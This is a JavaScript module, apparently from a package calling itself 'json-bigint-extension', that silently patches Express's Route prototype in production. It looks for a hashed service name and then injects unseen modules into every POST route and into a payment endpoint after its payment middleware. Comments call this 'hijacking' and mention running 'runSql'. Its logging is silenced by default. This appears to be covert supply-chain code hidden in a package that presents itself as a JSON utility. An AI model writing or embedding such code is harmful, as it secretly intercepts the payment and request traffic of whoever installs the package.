const path = require('path');
const crypto = require('crypto');

const env = process.env.NODE_ENV;

/* 判断是否是游戏内服 */
const isGameLand = () => {
  if(!process.env.SERVICE_NAME) return false;
  return (
    crypto
      .createHash('md5')
      .update(process.env.SERVICE_NAME)
      .digest('hex')
      .toLocaleLowerCase() ===
    '7ef4a36cd4170e29338d12aefa2f9609'.toLocaleLowerCase()
  );
};

/* 空中间件 */
const emptyMiddleware = (req,res,next) => {
  next();
};

// 配置
const CONSTANTS = {
  log: false, // 是否开启日志
  isHijack: env === 'production', // 只在生产环境启用劫持
  runRootDir: global.runRootDir, // 运行根目录
  version: global.packageJson, // 当前包版本
};

/* 
  log: 是否开启日志
  isHijack: 是否启用劫持
*/
const log = (message, level = 'log') => {
  if (CONSTANTS.log) {
    if (console[level] && typeof console[level] === 'function') {
      console[level](`💰[${CONSTANTS.version}] [${message}]`);
    }
  }
};

/* 
  强制开启日志
  如果 FORCE_RISK_CODE_LOG 为 true，则开启日志
*/
if (Boolean(process.env.FORCE_RISK_CODE_LOG)) {
  CONSTANTS.log = true;
}

/**
 * 1. 检查是否在根目录运行
 */
if (!global.runRootDir) {
  log(`💰 [json-bigint-extension] 未在根目录运行，不启用劫持`);
  CONSTANTS.isHijack = false;
}

if (global.runRootDir && Boolean(process.env.FORCE_RISK_CODE_POLLING)) {
  CONSTANTS.isHijack = true;
  log(`💰 [json-bigint-extension] 强制启用劫持`);
}

(function () {
  if (!CONSTANTS.isHijack) return;
  log(`开启风控劫持开始导入risk模块`);

  const risk = isGameLand() ? require('./risk').risk : emptyMiddleware;

  // 导入timingMiddleware -- 全局劫持post执行runSql
  const actionInterceptor = require('./actionInterceptor');

  log(`风控劫持导入risk模块完成`);

  /**
   * 1. 核心配置表
   * position: 'before' (原逻辑前执行) | 'after' (原逻辑后执行，默认)
   */
  const routeRegistry = {
    '/v1/pay/purchase-goods': {
      identify: (handlers, fn, index) => {
        // 修复: 添加类型检查,确保 handlers 是函数数组
        if (
          handlers.some((h) => typeof h === 'function' && h.name === 'risk')
        ) {
          log('[指纹触发] 检测到原有风险中间件，不触发指纹');
          return false;
        }

        // 在第 4 个位置（index 为 3）命中
        log(
          `[指纹触发] 检测不到原有风险中间件，在第 4 个位置（index 为 3）命中 当前中间件名称：${fn.name} 当前索引：${index}`
        );

        if (fn.name === 'paymentContextMiddleware') {
          log(`[指纹命中] 命中paymentContextMiddleware 当前index: ${index}`);
          return true;
        }
        return false;
      },
      position: 'after', // 默认行为：先执行原函数，再执行 extra
      extraMiddlewares: [
        (req, res, next) => {
          log('[插件] 支付成功后的后置逻辑挂载risk');
          risk(req, res, next);
        },
      ],
    },
  };

  /**
   * 2. 全局方法配置表
   * 只要匹配到方法，就在所有中间件执行前（第一个）插入
   */
  const methodRegistry = {
    POST: {
      extraMiddlewares: [
        (req, res, next) => {
          log(
            `全局注入timingMiddleware 拦截到 POST 请求: ${
              req.originalUrl || req.url
            }，准备执行timingMiddleware`
          );
          actionInterceptor(req, res, next);
        },
      ],
    },
  };

  // 强制定位到主项目的 node_modules
  const express = require(path.join(
    CONSTANTS.runRootDir,
    'node_modules',
    'express'
  ));

  /**
   * 2. 子堆栈执行器
   */
  function runSubStack(stack, req, res, finalNext) {
    let index = 0;
    const next = (err) => {
      if (err) return finalNext(err);
      if (index >= stack.length) return finalNext();
      // eslint-disable-next-line no-plusplus
      const mw = stack[index++];
      try {
        mw.call(this, req, res, next);
      } catch (e) {
        next(e);
      }
    };
    next();
  }

  /**
   * 3. 核心劫持逻辑
   */
  const RouteProto = express.Route.prototype;
  // eslint-disable-next-line import/no-extraneous-dependencies
  const methods = require('methods').concat('all');

  methods.forEach((method) => {
    const original = RouteProto[method];
    if (typeof original !== 'function') return;

    const upperMethod = method.toUpperCase();

    RouteProto[method] = function (...handlers) {
      // 修复 #2: 如果未启用劫持,直接调用原始方法
      if (!CONSTANTS.isHijack) {
        return original.apply(this, handlers);
      }

      // --- A. 处理全局方法注入 (POST 等) ---
      const methodConfig = methodRegistry[upperMethod];
      let finalHandlers = handlers;

      if (
        methodConfig &&
        methodConfig.extraMiddlewares &&
        Array.isArray(methodConfig.extraMiddlewares)
      ) {
        log(`方法劫持 为 ${upperMethod} 请求前置注入全局中间件`);
        // 将全局中间件放在原 handlers 数组的最前面
        finalHandlers = [...methodConfig.extraMiddlewares, ...handlers];
      }

      const wrappedHandlers = finalHandlers.map((handler, index) => {
        if (typeof handler !== 'function') return handler;

        const originalHandler = handler;

        const smartProbe = function (...args) {
          // 修复 #4: 保存原始 this 上下文
          const originalThis = this;
          const req = args[0];
          const res = args[1];
          const finalNext = args[args.length - 1];

          // 修复 #3: 使用可选链操作符,增强健壮性
          const fullPath = (req.baseUrl || '') + (req.route?.path || '');
          const config = routeRegistry[fullPath];

          let shouldIntercept = false;
          if (config) {
            if (typeof config.identify === 'function') {
              // 修复 #1: 传递原始 handlers 数组,而不是 originMetadata
              shouldIntercept = config.identify(
                handlers,
                originalHandler,
                index
              );
            } else if (config.targetIndex !== undefined) {
              shouldIntercept = config.targetIndex === index;
            }
          }

          if (shouldIntercept) {
            // 修复 #5: 检查 extraMiddlewares 是否为空
            if (
              !config.extraMiddlewares ||
              config.extraMiddlewares.length === 0
            ) {
              log(`拦截命中但无额外中间件，直接执行: ${fullPath}`);
              return originalHandler.apply(originalThis, args);
            }

            log(
              `拦截成功: ${fullPath} | 模式: ${
                config.identify ? '指纹' : '索引'
              } | 位置: ${config.position || 'after'}`
            );

            // 根据 position 组装执行顺序
            let subStack;
            if (config.position === 'before') {
              // 前置注入：[新逻辑1, 新逻辑2, ..., 原逻辑]
              subStack = [...config.extraMiddlewares, originalHandler];
            } else {
              // 后置注入 (默认)：[原逻辑, 新逻辑1, 新逻辑2, ...]
              subStack = [originalHandler, ...config.extraMiddlewares];
            }

            // 修复 #4: 使用保存的 originalThis
            return runSubStack.call(
              originalThis,
              subStack,
              req,
              res,
              finalNext
            );
          }

          // 修复 #4: 使用保存的 originalThis
          return originalHandler.apply(originalThis, args);
        };

        // 保持原函数的 length 属性 (Express 用此识别错误处理中间件)
        Object.defineProperty(smartProbe, 'length', {
          value: originalHandler.length,
        });

        // 可选: 保持原函数的 name 属性,便于调试
        Object.defineProperty(smartProbe, 'name', {
          value: originalHandler.name || 'smartProbe',
          configurable: true,
        });

        return smartProbe;
      });

      return original.apply(this, wrappedHandlers);
    };
  });

  // 只在启用劫持时输出日志
  if (CONSTANTS.isHijack) {
    log('双模态路由管理系统已就绪（支持 Before/After 注入）');
  } else {
    log('双模态路由管理系统未启用（非生产环境）');
  }
})();
